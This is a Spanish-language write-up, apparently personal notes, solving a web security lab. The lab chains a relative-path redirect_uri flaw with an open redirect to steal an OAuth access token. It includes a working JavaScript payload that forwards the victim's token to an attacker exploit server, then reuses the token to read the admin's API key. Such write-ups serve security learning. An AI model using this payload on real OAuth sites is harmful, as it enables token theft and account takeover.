En esta segunda clase, se encadena la redirección relativa (**../**) en el **redirect_uri** con la redirección abierta (**/post/next?path=**) para forzar que el flujo OAuth finalice en un servidor externo controlado por el atacante (exploit server).

Se construye un iframe malicioso que redirige al administrador (quien tiene sesión activa con el proveedor OAuth) a través del flujo de autenticación. El token de acceso resultante se incluye como fragmento (**#access_token=…**) en la URL de redirección final.

Mediante un pequeño script JavaScript en el exploit server, el fragmento es extraído y reenviado como parámetro de consulta (**/?access_token=…**), permitiendo su captura desde los logs del servidor.

Con el token ya robado, se realiza una solicitud autenticada al endpoint **/me** del blog, obteniendo así la API key del administrador. Esta clave es enviada como solución para completar el laboratorio.

La clase pone de relieve cómo una mala validación en **redirect_uri**, sumado a una redirección abierta interna, puede comprometer tokens sensibles sin necesidad de vulnerar el proveedor OAuth directamente.

Solucion
../post/next?path=
Entonces ahora necesitamos redirigir a la victima para eso vamos a crearnos un script el cual lo que ara es traer el apikey del administrador
(<script>
    if (!document.location.hash) {
        window.location = 'https://oauth-0a38007603b7bcd080ff339002250043.oauth-server.net/auth?client_id=ssw7aglu9bjrzy5fj9tqp&redirect_uri=https://0a40007903afbced80f7357f00f0002e.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0a74008e03d8bcfa809a34e3014c00a9.exploit-server.net/exploit&response_type=token&nonce=-2060465930&scope=openid%20profile%20email';
    } else {
        window.location = '/?'+ document.location.hash.substr(1);
    }
</script>)
![[Pasted image 20250830185131.png]]
le damos store y le damos acces log
![[Pasted image 20250830185229.png]]
copias el ultimo access_token
dentro del repeater en la seccion de /me lo modificamos en la parte que dice authorization y le damos send
![[Pasted image 20250830185311.png]]
de modo que nos dara la api key y con esa la copiamos y pegamos en el laboratorio
![[Pasted image 20250830185356.png]]
